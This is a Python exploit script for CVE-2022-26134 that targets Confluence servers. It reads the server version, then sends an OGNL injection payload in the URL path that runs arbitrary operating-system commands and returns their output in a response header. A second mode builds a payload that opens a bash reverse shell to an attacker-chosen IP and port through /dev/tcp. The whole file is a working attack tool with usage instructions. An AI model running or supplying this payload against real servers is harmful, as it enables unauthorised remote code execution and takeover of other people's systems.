#!/usr/bin/python3
# coding: utf-8
# cve2022-26134
# by: lxxl
import urllib
import requests
import re
import sys
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings()
import argparse



def check(url):
    r = requests.get(url + "/login.action", verify=False)
    if (r.status_code == 200):
        filter_version = re.findall("<span id='footer-build-information'>.*</span>", r.text)
        if (len(filter_version) >= 1):
            version = filter_version[0].split("'>")[1].split('</')[0]
            return version
        else:
            return False
    else:
        return url


def exploit(url, command):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
    }
    r = requests.get(
        url + '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22' + command + '%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/',
        headers=headers, verify=False, allow_redirects=False)
    if (r.status_code == 302):
        return r.headers['X-Cmd-Response']
    else:
        return False

def shell():
        shell = ip + "/" + port
        shell1 = "'bash','-c','bash -i >& "
        exp = shell1 + "/dev/tcp/"  + shell + " 0>&1'"
        payload1 = '''${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('''
        payload2 = exp + ''').start()")}/'''
        payloads = payload1 + payload2
        s = urllib.parse.quote(payloads)
        return s


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='cve2022-26134')
    parser.add_argument('-u', '--url', help='target url', required=False)
    parser.add_argument('-c', '--command', help='command', required=False)
    parser.add_argument('-i', '--lhost', help='type', required=False)
    parser.add_argument('-p', '--lport', help='type', required=False)
    args = parser.parse_args()
    cmd = args.command
    ip = args.lhost
    port = args.lport

    if (len(sys.argv) < 3):
        print("USE: python3 " + sys.argv[0] + " -u https://target.com -c command")
        print("ex: python3 " + sys.argv[0] + " -u https://target.com -i  your.ip -p your.port")

    if (sys.argv[3] == "-i"):
            target = args.url
            ip = args.lhost
            port = args.lport
            e = requests.get(target + shell())
            if e.status_code == 200 or e.status_code == 302:
                    print("[+] exploit success")
            else:
                    print("[-] exploit failed")

    else:
        target = args.url
        cmd = cmd.replace("'", "")
        version = check(target)
        print("============ GET Confluence Version ============")
        if (version):
            print("Version: " + version)
        else:
            print("Version: Not Found")
        print(exploit(target, cmd))


